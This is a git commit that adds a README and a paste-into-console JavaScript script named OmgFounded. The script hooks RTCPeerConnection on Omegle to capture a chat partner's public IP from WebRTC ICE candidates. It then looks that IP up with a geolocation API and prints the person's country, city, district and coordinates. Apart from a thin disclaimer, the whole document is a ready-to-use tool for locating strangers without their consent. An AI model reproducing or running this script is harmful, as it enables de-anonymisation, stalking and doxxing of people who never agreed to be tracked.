e1de70fdccccb388ad4a2879dbf1d83cda14d99a
ex_ode <56847003+Ex0D@users.noreply.github.com>
2021-02-21 00:28:08 +0100

    Commited

---
+++ README.md
@@ -0,0 +1,17 @@
+# OmgFounded
+
+**Disclaimer :**
+* I'm not the owner of the following code (see [this](https://www.youtube.com/watch?v=fN9cWpY5zUc) video)
+* I don't encourage anyone to use this script (except to try it to show how easy it is to find an IP on a P2P network)
+* I've made a few changes on this script, but nothing very important
+
+**How to use it :**
+You just have to copy and paste the script into the browser console at the moment you enter Omegle.
+*Don't forget to replace the variable "apiKey" by your token that you can get [here](https://ipgeolocation.io/)*
+
+That's it
+
+**Ressources to understand how it's work :**
+[P2P](https://en.wikipedia.org/wiki/Peer-to-peer)
+[RTCPeerConnection](https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection)
+[STUN](https://en.wikipedia.org/wiki/STUN)
---
+++ copy-this-in-console-browser.js
@@ -0,0 +1,43 @@
+let apiKey = "your-api-key-here"; // get own here ► https://ipgeolocation.io/
+
+window.oRTCPeerConnection =
+  window.oRTCPeerConnection || window.RTCPeerConnection;
+
+window.RTCPeerConnection = function (...args) {
+  const pc = new window.oRTCPeerConnection(...args);
+
+  pc.oaddIceCandidate = pc.addIceCandidate;
+
+  pc.addIceCandidate = function (iceCandidate, ...rest) {
+    const fields = iceCandidate.candidate.split(" ");
+
+    console.log(iceCandidate.candidate);
+    const ip = fields[4];
+    if (fields[7] === "srflx") {
+      getLocation(ip);
+    }
+    return pc.oaddIceCandidate(iceCandidate, ...rest);
+  };
+  return pc;
+};
+
+let getLocation = async (ip) => {
+  let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${ip}`;
+
+  await fetch(url).then((response) =>
+    response.json().then((json) => {
+      const output = `
+        ---------------------
+          Country: ${json.country_name || "No data"}
+          State: ${json.state_prov || "No data"}
+          City: ${json.city || "No data"}
+          District: ${json.district || "No data"}
+          Lat / Long: (${json.latitude}, ${json.longitude})
+        ---------------------
+        `;
+        
+      console.clear();
+      console.log(output);
+    })
+  );
+};
